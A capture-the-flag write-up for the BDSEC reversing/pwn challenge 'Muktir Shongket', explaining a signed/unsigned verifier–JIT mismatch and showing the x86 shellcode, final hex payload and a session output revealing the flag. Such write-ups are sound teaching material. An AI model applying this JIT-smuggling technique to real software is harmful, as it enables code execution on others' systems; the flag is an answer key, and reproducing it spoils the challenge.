
## Muktir Shongket: BDSEC CTF Writeup

**Challenge:** Muktir Shongket **Category:** Reverse Engineering / Pwn **Author:** NomanProdhan

### The Vibe

This challenge drops us into a simulated Liberation War communication terminal. You can upload hex-encoded "transmissions" (custom bytecode), and the system has two main parts: a **verifier** that checks your homework to make sure the commands are legit, and a **field engine** (basically a JIT compiler) that actually translates and runs them in native x86 memory.

The description hints that the verification unit and the field engine "may not agree on the route." Spoiler alert: they really don't, and that's exactly how we break it.

### The Bug: A Tale of Two Maps

After tearing apart the stripped 64-bit ELF, we find a classic verifier/JIT mismatch. There are three main opcodes we care about:

- `ROUTE` (`0x30`): Takes a 1-byte offset.
    
- `SIGNAL` (`0x20`): Takes an 8-byte payload.
    
- `END` (`0x40`): Finishes the execution.
    
- `FREEDOM` (`0xf0`): Prints the flag, but the verifier instantly rejects it. So we can't just send `f0`.
    

The vulnerability lives entirely in how the system handles the `ROUTE` command:

1. **The Verifier** uses an unsigned read (`movzx`) on the operand. It treats your 1 byte as a standard bytecode-space offset (`target = bytecode_pos + 2 + operand`). It just does a quick math check to ensure you aren't jumping out of bounds, nods, and moves on.
    
2. **The JIT Engine**, on the other hand, uses a signed read (`movsx`) and actually writes a native x86 jump (`E9 xx xx xx xx`) into executable memory.
    

Because native instructions take up a different amount of space than the bytecode representations (e.g., `ROUTE` takes 5 bytes natively, `SIGNAL` takes 10), the bytecode offsets and the native JIT offsets completely desync.

### The Exploit

Since `FREEDOM` is hard-banned by the verifier, we have to call the internal "print flag" function (living at `0x401bb0`) ourselves.

Here's the trick: when the JIT engine sees the `SIGNAL` opcode, it writes a native short jump (`EB 08`) to skip over the next 8 bytes, and then just copies your 8 bytes of "data" directly into the executable buffer.

If we use `ROUTE` to jump _over_ that `EB 08` instruction, we can force the program to execute our raw `SIGNAL` data as native x86 instructions.

**The Shellcode Payload:** We just need those 8 bytes of data to be shellcode that jumps to the flag-printing function.

Code snippet

```
mov eax, 0x401bb0
jmp rax
nop
```

Compiled to hex, that's `B8 B0 1B 40 00 FF E0 90`.

**Putting it together:** We structure the bytecode like this:

1. `30 02`: `ROUTE` with an offset of 2. The verifier thinks this is a harmless 2-byte skip. The JIT translates this to `jmp +2`.
    
2. `20 [shellcode]`: `SIGNAL` with our shellcode. The JIT lays down `EB 08` (which is exactly 2 bytes!), followed by our shellcode.
    
3. `40`: `END`.
    

When this runs, `ROUTE` jumps forward exactly 2 bytes in the native buffer, landing _perfectly_ past the `SIGNAL` skip and executing our shellcode.

**Final Hex String:** `300220b8b01b4000ffe09040`

### The Execution

Throwing the payload at the remote server gets us the flag:

Plaintext

```
========================================
             MUKTIR SHONGKET
       FIELD COMMUNICATION TERMINAL
========================================
Every transmission requires command approval.

1. Upload coded transmission
2. Inspect decoded orders
3. Verify transmission
4. Execute transmission
5. Clear terminal
6. Disconnect
> 1
Hex transmission: 300220b8b01b4000ffe09040
Stored 12 transmission bytes.

> 3
Transmission approved by command verification.

> 4
Relaying orders to field execution engine...

[+] Freedom broadcast authenticated.
BDSEC{mukt1r_5h0ngk3t_r34ch3d_th3_f13ld}
Transmission execution completed.
```

